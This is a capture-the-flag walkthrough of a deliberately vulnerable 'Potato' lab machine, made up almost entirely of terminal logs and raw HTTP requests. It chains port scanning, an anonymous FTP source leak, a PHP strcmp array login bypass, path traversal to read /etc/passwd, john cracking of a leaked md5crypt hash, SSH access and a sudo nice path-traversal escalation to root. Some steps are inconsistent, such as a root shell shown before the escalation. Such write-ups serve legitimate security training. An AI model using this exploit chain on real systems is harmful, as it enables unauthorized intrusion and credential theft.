@@ -1,0 +1,310 @@
+└─$ nmap -p- 172.16.33.43 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-15 00:38 EDT
+Nmap scan report for 172.16.33.43
+Host is up (0.029s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+2112/tcp open  kip
+
+└─$ nmap -sV -A 172.16.33.43        
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-15 01:39 EDT
+Nmap scan report for 172.16.33.43
+Host is up (0.029s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 ef:24:0e:ab:d2:b3:16:b4:4b:2e:27:c0:5f:48:79:8b (RSA)
+|   256 f2:d8:35:3f:49:59:85:85:07:e6:a2:0e:65:7a:8c:4b (ECDSA)
+|_  256 0b:23:89:c3:c0:26:d5:64:5e:93:b7:ba:f5:14:7f:3e (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Potato company
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+|
+2112/tcp open  ftp     ProFTPD
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
+|_-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
+
+└─$ sudo dirsearch -u http://172.16.33.43
+[sudo] password for kali: 
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/kali/reports/http_172.16.33.43/_24-07-15_01-46-46.txt
+
+Target: http://172.16.33.43/
+
+[01:46:46] Starting: 
+[01:46:49] 403 -  277B  - /.ht_wsr.txt
+[01:46:49] 403 -  277B  - /.htaccess.bak1
+[01:46:49] 403 -  277B  - /.htaccess.orig
+[01:46:49] 403 -  277B  - /.htaccess.sample
+[01:46:49] 403 -  277B  - /.htaccess.save
+[01:46:49] 403 -  277B  - /.htaccess_orig
+[01:46:49] 403 -  277B  - /.htaccess_extra
+[01:46:49] 403 -  277B  - /.htaccess_sc
+[01:46:49] 403 -  277B  - /.htaccessBAK
+[01:46:49] 403 -  277B  - /.htaccessOLD
+[01:46:49] 403 -  277B  - /.htaccessOLD2
+[01:46:49] 403 -  277B  - /.htm
+[01:46:49] 403 -  277B  - /.html
+[01:46:49] 403 -  277B  - /.htpasswd_test
+[01:46:49] 403 -  277B  - /.htpasswds
+[01:46:49] 403 -  277B  - /.httr-oauth
+[01:46:50] 403 -  277B  - /.php
+[01:46:54] 301 -  312B  - /admin  ->  http://172.16.33.43/admin/
+[01:46:54] 200 -  228B  - /admin/
+[01:46:55] 200 -  228B  - /admin/index.php
+[01:46:55] 200 -  487B  - /admin/logs/
+[01:47:13] 403 -  277B  - /server-status/
+[01:47:13] 403 -  277B  - /server-status
+
+#get a cource code file from ftp,which is for the web page login 
+
+─$ ftp 172.16.33.43 2112
+Connected to 172.16.33.43.
+220 ProFTPD Server (Debian) [::ffff:172.16.33.43]
+Name (172.16.33.43:edk): anonymous
+331 Anonymous login ok, send your complete email address as your password
+Password: 
+230-Welcome, archive user anonymous@_gateway !
+230-
+230-The local time is: Wed Nov 16 13:47:25 2022
+230-
+230 Anonymous access granted, restrictions apply
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||54650|)
+150 Opening ASCII mode data connection for file list
+-rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
+-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
+226 Transfer complete
+ftp> get index.php.bak
+local: index.php.bak remote: index.php.bak
+229 Entering Extended Passive Mode (|||36539|)
+150 Opening BINARY mode data connection for index.php.bak (901 bytes)
+   901        3.25 MiB/s 
+226 Transfer complete
+901 bytes received in 00:00 (28.72 KiB/s)
+ftp> bye
+221 Goodbye.
+
+└─$ cat index.php.bak 
+<html>
+<head></head>
+<body>
+
+<?php
+
+$pass= "potato"; //note Change this password regularly
+
+if($_GET['login']==="1"){
+  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
+    echo "Welcome! </br> Go to the <a href=\"dashboard.php\">dashboard</a>";
+    setcookie('pass', $pass, time() + 365*24*3600);
+  }else{
+    echo "<p>Bad login/password! </br> Return to the <a href=\"index.php\">login page</a> <p>";
+  }
+  exit();
+}
+?>
+
+
+  <form action="index.php?login=1" method="POST">
+                <h1>Login</h1>
+                <label><b>User:</b></label>
+                <input type="text" name="username" required>
+                </br>
+                <label><b>Password:</b></label>
+                <input type="password" name="password" required>
+                </br>
+                <input type="submit" id='submit' value='Login' >
+  </form>
+</body>
+</html>
+
+
+#for strcmp, If we pass an array instead of a string to strcmp(), it gives a warning but evaluates the result as 0. 
+
+POST /admin/index.php?login=1 HTTP/1.1
+Host: 172.16.33.43
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+Origin: http://172.16.33.43
+Connection: close
+Referer: http://172.16.33.43/admin/
+Upgrade-Insecure-Requests: 1
+
+username=admin&password[]=dsa
+
+#the response changes
+
+HTTP/1.1 200 OK
+Date: Wed, 16 Nov 2022 14:07:24 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Set-Cookie: pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh; expires=Thu, 16-Nov-2023 14:07:24 GMT; Max-Age=31536000
+Vary: Accept-Encoding
+Content-Length: 91
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head></head>
+<body>
+
+Welcome! </br> Go to the <a href="dashboard.php">dashboard</a>
+
+#then get to the dashboard page, under 'Logs', file inclusion is available
+
+POST /admin/dashboard.php?page=log HTTP/1.1
+Host: 172.16.33.43
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+Origin: http://172.16.33.43
+Connection: close
+Referer: http://172.16.33.43/admin/dashboard.php?page=log
+Cookie: pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh
+Upgrade-Insecure-Requests: 1
+
+file=../../../../../etc/password
+
+Contenu du fichier ../../../../../etc/passwd :
+
+**************************************************************
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+florianges:x:1000:1000:florianges:/home/florianges:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+proftpd:x:112:65534::/run/proftpd:/usr/sbin/nologin
+ftp:x:113:65534::/srv/ftp:/usr/sbin/nologin
+webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
+jeffzua:x:1002:1002::/home/jeffzua:/bin/sh
+
+
+# for the last second line,
+
+──(edk㉿kali)-[~]
+└─$ echo 'webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash' > passwd
+
+└─$ john passwd
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
+Will run 4 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+dragon           (webadmin)     
+1g 0:00:00:00 DONE 2/3 (2024-07-16 15:07) 5.882g/s 7411p/s 7411c/s 7411C/s 123456..larry
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+#try to ssh the Target
+─$ ssh webadmin@172.16.33.43 
+Last login: Sun Aug  2 19:56:20 2020 from 192.168.1.11
+webadmin@serv:~$ id
+uid=1001(webadmin) gid=1001(webadmin) groups=1001(webadmin)
+webadmin@serv:~$ ls
+user.txt
+webadmin@serv:~$ cat user.txt
+TGUgY29udHLDtGxlIGVzdCDDoCBwZXUgcHLDqHMgYXVzc2kgcsOpZWwgcXXigJl1bmUg
+
+root@serv:/home/webadmin# cat .bash_history 
+ls
+exit
+ls
+sudo -l
+exit
+sudo -l
+exit
+sudo -l
+exit
+ls
+sudo -l
+sudo /bin/cat /etc/passwd
+sudo /bin/cat /etc/passwd ; ls /root
+exit
+sudo -l
+mkdir notes
+exit
+ls
+cd ..
+sudi -l
+sudo -l
+sudo /bin/ls /root/notes/test.txt
+sudo /bin/ls /root/notes/test.txt /root
+exit
+sudo /bin/nice /root/notes/
+sudo /bin/nice /root/notes/*
+ls
+exit
+sudo /bin/nice /root/notes/*
+exit
+root@serv:/home/webadmin#
+
+£back to home/ 
+webadmin@serv:~$ echo '/bin/bash' > she.sh
+webadmin@serv:~$ chmod +x she.sh
+webadmin@serv:~$ sudo /bin/nice /notes/../home/webadmin/she.sh 
+
+root@serv:/home/webadmin# id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@serv:~# cat root.txt 
+bGljb3JuZSB1bmlqYW1iaXN0ZSBxdWkgZnVpdCBhdSBib3V0IGTigJl1biBkb3VibGUgYXJjLWVuLWNpZWwuIA==
+
+echo bGljb3JuZSB1bmlqYW1iaXN0ZSBxdWkgZnVpdCBhdSBib3V0IGTigJl1biBkb3VibGUgYXJjLWVuLWNpZWwuIA== | base64 -d
+licorne unijambiste qui fuit au bout d’un double arc-en-ciel.
+
+One-legged unicorn who flees at the end of a double rainbow
+
+
